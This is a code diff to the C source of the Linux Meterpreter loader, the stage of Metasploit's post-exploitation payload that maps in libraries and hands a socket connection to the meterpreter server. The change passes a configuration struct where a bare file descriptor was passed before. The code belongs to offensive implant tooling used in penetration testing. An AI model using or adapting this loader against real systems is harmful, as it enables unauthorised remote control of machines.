@@ -36,6 +36,9 @@
 #include "libmetsrv_main.h"
 #include "libpcap.h"
 
+#include "../../common/compat_types.h"
+#include "../../common/config.h"
+
 struct libs {
 	char *name;
 	void *buf;
@@ -78,14 +81,14 @@ char sock_path[UNIX_PATH_MAX] = "/tmp/meterpreter.sock";
  * Map in libraries, and hand off execution to the meterpreter server
  */
 
-unsigned metsrv_rtld(int fd, int options)
+unsigned metsrv_rtld(MetsrvConfig* config, int options)
 {
 	int i;
 	int (*libc_init_common)();
 	int (*server_setup)();
 	struct stat statbuf;
 
-	INFO("[ preparing to link. fd = %d ]\n", fd);
+	INFO("[ preparing to link. config = 0x%08x, fd = %d ]\n", (unsigned int)config, config->session.comms_fd);
 
 	for(i = 0; i < sizeof(libs) / sizeof(struct libs); i++) {
 		libs[i].handle = (void *) dlopenbuf(libs[i].name, libs[i].buf, libs[i].size);
@@ -135,20 +138,20 @@ unsigned metsrv_rtld(int fd, int options)
 			exit(-1);
 		}
 
-		fd = pass_fd(libs[LIBC_IDX].handle);
-		if (fd == -1) {
+		config->session.comms_fd = pass_fd(libs[LIBC_IDX].handle);
+		if (config->session.comms_fd == -1) {
 			exit(-1);
 		} else {
 			TRACE("[ Warning the migrating process and give to the server time to catch up... ]\n");
 			raise(SIGTRAP);
 			sleep(4);
 		}
-	} else if(fstat(fd, &statbuf) == -1) {
+	} else if(fstat(config->session.comms_fd, &statbuf) == -1) {
 		options = OPT_DEBUG_ENABLE;
 
 		TRACE("[ supplied fd fails fstat() check, using dlsocket() ]\n");
-		fd = dlsocket(libs[LIBC_IDX].handle);
-		if(fd == -1) {
+		config->session.comms_fd = dlsocket(libs[LIBC_IDX].handle);
+		if(config->session.comms_fd == -1) {
 			TRACE("[ failed to dlsocket() a connection. exit()ing ]\n");
 			exit(-1);
 		}
@@ -169,12 +172,12 @@ unsigned metsrv_rtld(int fd, int options)
 	TRACE("[ logging will stop unless OPT_NO_FD_CLEANUP is set ]\n");
 
 	if(!(options & OPT_NO_FD_CLEANUP)) {
-		perform_fd_cleanup(&fd);
+		perform_fd_cleanup((int*)&config->session.comms_fd);
 	}
 
 	server_setup = dlsym(libs[METSRV_IDX].handle, "server_setup");
 	TRACE("[ metsrv server_setup is at 0x%x, calling ]\n", server_setup);
-	server_setup(fd);
+	server_setup(config);
 
 	TRACE("[ metsrv_rtld(): server_setup() returned, exit()'ing ]\n");
 	exit(1);
@@ -554,7 +557,7 @@ void handle_crashes()
  * it will connect to the metasploit meterpreter server.
  */
 
-void _start(int fd, int options)
+void _start(MetsrvConfig* config, int options)
 {
 	alarm(0);			// clear out any pending alarms.
 
@@ -563,5 +566,5 @@ void _start(int fd, int options)
 
 	handle_crashes();		// try to make debugging a little easier.
 
-	metsrv_rtld(fd, options);
+	metsrv_rtld(config, options);
 }
